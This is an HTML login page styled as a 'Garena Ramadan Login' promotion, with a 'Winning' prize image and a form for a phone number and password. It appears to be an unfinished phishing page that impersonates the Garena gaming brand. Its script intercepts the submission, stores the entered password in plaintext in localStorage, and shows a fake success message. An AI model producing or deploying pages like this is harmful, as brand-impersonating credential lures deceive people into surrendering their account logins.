<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Ramadan Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    
    <div class="container">
        <img src="image.png" >
        <h2>Garena Ramadan Login</h2>
        <div><img src="imagecopy.png" alt="Winning"></div>

        <form action="https://upload.wikimedia.org/wikipedia/en/1/13/GarenaLogo.png" method="post">
            <label for="phone_number">Phone Number:</label><br>
            <input type="text" id="phone_number" name="phone_number" required pattern="\d{10}"><br>

            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br><br>

            <!-- Show Password Button -->
            <button type="button" id="showPassword">Show Password</button><br><br>

            <input type="submit" value="Log In">
        </form>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const phoneNumber = document.getElementById('phone_number').value;
            const password = document.getElementById('password').value;

            // Save the data to local storage
            localStorage.setItem('phone_number', phoneNumber);
            localStorage.setItem('password', password);

            alert('Form submitted successfully!');
        });

        // Show password toggle functionality
        document.getElementById('showPassword').addEventListener('click', function() {
            const passwordField = document.getElementById('password');
            const currentType = passwordField.type;
            
            if (currentType === 'password') {
                passwordField.type = 'text'; // Show the password
                this.textContent = 'Hide Password'; // Change button text
            } else {
                passwordField.type = 'password'; // Hide the password
                this.textContent = 'Show Password'; // Change button text
            }
        });
    </script>
</body>
</html>
